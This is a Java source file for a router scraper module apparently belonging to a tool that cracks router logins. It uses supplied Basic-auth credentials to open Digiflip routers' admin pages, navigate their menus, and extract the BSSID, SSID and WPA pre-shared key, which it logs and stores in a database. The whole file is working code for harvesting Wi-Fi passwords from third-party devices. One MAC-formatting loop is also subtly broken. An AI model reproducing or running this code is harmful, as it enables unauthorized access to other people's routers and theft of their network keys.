/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.basicauth;

import com.gargoylesoftware.htmlunit.ElementNotFoundException;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScraper;
import org.koreops.tauro.core.db.DbConnEngine;
import org.koreops.tauro.core.exceptions.DbDriverException;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;

/**
 * Scraper module for Digiflip routers.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 */
public class DigiflipScraper extends AbstractScraper {

  public DigiflipScraper(String host, String hostUrl, AuthCrackParams params) {
    super(host, hostUrl, params);
  }

  @Override
  public boolean scrapeAndLog() throws DbDriverException {
    return this.logDigiflipStation();
  }

  private boolean logDigiflipStation() throws DbDriverException {
    try {
      boolean newRouter = false;

      Document doc = Jsoup.connect(hostUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Logger.debug(host + ": Title: " + doc.title());

      if (newDigiflipTitles.contains(doc.title())) {
        newRouter = true;
      } else if (oldDigiflipTitles.contains(doc.title())) {
        newRouter = false;
      } else {
        Logger.info(host + ": Not a Digiflip router.");
        return false;
      }

      System.out.println("Found COSHIP");

      webClient.addRequestHeader("Authorization", "Basic " + base64Login);
      HtmlPage mainPage = webClient.getPage(hostUrl);

      Logger.debug(host + ": Title: " + mainPage.getTitleText());

      if (newDigiflipTitles.contains(mainPage.getTitleText())) {
        return logNewDigiflip(mainPage);
      } else if (oldDigiflipTitles.contains(mainPage.getTitleText())) {
        return logOldDigiflip(mainPage);
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (FailingHttpStatusCodeException ex) {
      Logger.error(host + ": FailingHttpStatusCodeException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (ElementNotFoundException ex) {
      Logger.error(host + ": ElementNotFoundException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(NewTpLinkScraper.class.getName()).log(Level.SEVERE, null, ex);
    } catch (DbDriverException ex) {
      throw ex;
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(NewTpLinkScraper.class.getName()).log(Level.SEVERE, null, ex);
    }
    return false;
  }

  private boolean logNewDigiflip(HtmlPage mainPage) throws IOException, InterruptedException, DbDriverException {
    Thread.sleep(1000);     // Let the javascript load the menu.
    ((HtmlPage) mainPage.getFrameByName("menu").getEnclosedPage()).getAnchorByName("sub24").click();
    Thread.sleep(1000);     // Let the javascript load the menu.
    HtmlPage menu = ((HtmlPage) mainPage.getFrameByName("menu").getEnclosedPage()).getAnchorByName("sub25").click();

    Document doc = Jsoup.parse(((HtmlPage) mainPage.getFrameByName("view").getEnclosedPage()).asXml());

    Elements elements = doc.select("table tbody tr");

    String macAddr = "";
    boolean wifiAvailable = false;

    for (Element element : elements) {
      if (element.select("td:eq(0) font b") != null) {
        if ("BSSID".equalsIgnoreCase(element.select("td:eq(0) font b").text())) {
          wifiAvailable = true;
          macAddr = element.select("td:eq(1) font").text();
          macAddr = macAddr.replace("-", ":");
          Logger.info(host + ": Found MAC: " + macAddr);
        }
      }
    }

    if (!wifiAvailable) {
      Logger.error(host + ": Wifi not available.", true);
      return false;
    }

    Map<String, String> wifiData = new HashMap();

    wifiData.put("BSSID", macAddr.toLowerCase());

    menu.getAnchorByName("sub3").click();
    Thread.sleep(1000);     // Let the javascript load the menu.
    menu = menu.getAnchorByName("sub4").click();

    doc = Jsoup.parse(((HtmlPage) mainPage.getFrameByName("view").getEnclosedPage()).asXml());
    elements = doc.select("html");
    if ((elements.get(0).select("input[name=ssid0]") != null) && (!"".equals(elements.get(0).select("input[name=ssid0]").val()))) {
      wifiData.put("SSID", elements.get(0).select("input[name=ssid0]").val());
    }

    if (wifiData.get("SSID") == null) {
      return false;
    }

    Logger.info(host + ": Found SSID: " + wifiData.get("SSID"));

    menu.getAnchorByName("sub6").click();

    Thread.sleep(5000);

    doc = Jsoup.parse(((HtmlPage) ((HtmlPage) mainPage.getFrameByName("view").getEnclosedPage())
        .getFrameByName("SSIDAuthMode").getEnclosedPage()).asXml());

    elements = doc.select("html");

    for (Element element : elements) {
      for (Element e : element.select("select#method option")) {
        if (e.hasAttr("selected")) {
          wifiData.put("Encryption", e.text());
        }
      }

      if ("WEP".equalsIgnoreCase(wifiData.get("Encryption"))) {
        Logger.error(host + ": WEP found. Write code to get the key!");
      }

      wifiData.put("AuthType", "Auto");

      for (Element e : element.select("script")) {
        if (e.data().contains("dF.pskValue0.value=")) {
          System.out.println("Found the shit!");
          String theScript = e.data();
          int i = theScript.indexOf("dF.pskValue0.value=");
          String pass = "";
          i += "dF.pskValue0.value=".length() + 1; // To bypass the quote
          char c = theScript.charAt(i);
          i++;
          while (true) {
            System.out.println(pass);
            pass += c;
            c = theScript.charAt(i);
            i++;
            if (c == '"') {
              break;
            }
          }
          wifiData.put("key", pass);
          Logger.info(host + ": Found key: " + wifiData.get("key"));
          break;
        }
      }
    }

    if ((wifiData.get("SSID") == null) && (wifiData.get("key") == null)) {
      Logger.debug(host + ": Security disabled or not a standard router. Either way, not our concern.");
      return false;
    }

    Logger.info(host + ": Found AuthType: " + wifiData.get("AuthType"));
    Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));

    UpdaterDao.saveStation(wifiData, host, DbConnEngine.getConnection());
    return true;
  }

  private boolean logOldDigiflip(HtmlPage mainPage) throws IOException, InterruptedException, DbDriverException {

    String macAddr = null;

    Document doc = Jsoup.connect(hostUrl + "/status.htm").userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

    Elements data = doc.select("script");

    for (Element datum : data) {
      if (datum.data().contains("bssid_drv[0] ='")) {
        String theScript = datum.data();
        int i = theScript.indexOf("bssid_drv[0] ='");
        i += "bssid_drv[0] ='".length(); // To bypass the quote
        char c = theScript.charAt(i);
        i++;
        macAddr = "";
        while (true) {
          macAddr += c;
          c = theScript.charAt(i);
          i++;
          if (c == '\'') {
            break;
          }
        }
        break;
      }
    }

    doc = Jsoup.parse(mainPage.asXml());

    Elements elements = doc.select("html");

    System.out.println(mainPage.asXml());

    Thread.sleep(5000);

    if (macAddr == null) {
      Logger.error(host + ": Not an old digiflip.", true);
      return false;
    }

    macAddr = macAddr.replace("-", ":");
    if (!macAddr.contains(":")) {
      String tmpMac = macAddr;
      macAddr = "";
      for (int i = 0; i < macAddr.length(); i++) {
        if ((i > 0) && (i % 2 == 0)) {
          macAddr += ":";
        }
        macAddr += tmpMac.charAt(i);
      }
    }

    Logger.info(host + ": Found MAC: " + macAddr);

    Map<String, String> wifiData = new HashMap();

    wifiData.put("BSSID", macAddr.toLowerCase());
    wifiData.put("SSID", elements.get(0).select("input#ssid[name=ssid]").val());
    wifiData.put("key", elements.get(0).select("input#pskValue[name=pskValue]").val());
    wifiData.put("AuthType", "WPA/WPA2 PSK");
    wifiData.put("Encryption", "TKIP/AES");

    if ((wifiData.get("SSID") == null) && (wifiData.get("key") == null)) {
      Logger.debug(host + ": Not an old Digiflip or not WPA. FIX THIS!");
      return false;
    }

    Logger.info(host + ": Found SSID: " + wifiData.get("SSID"));
    Logger.info(host + ": Found key: " + wifiData.get("key"));
    Logger.info(host + ": Found AuthType: " + wifiData.get("AuthType"));
    Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));

    UpdaterDao.saveStation(wifiData, host, DbConnEngine.getConnection());

    return true;
  }

}
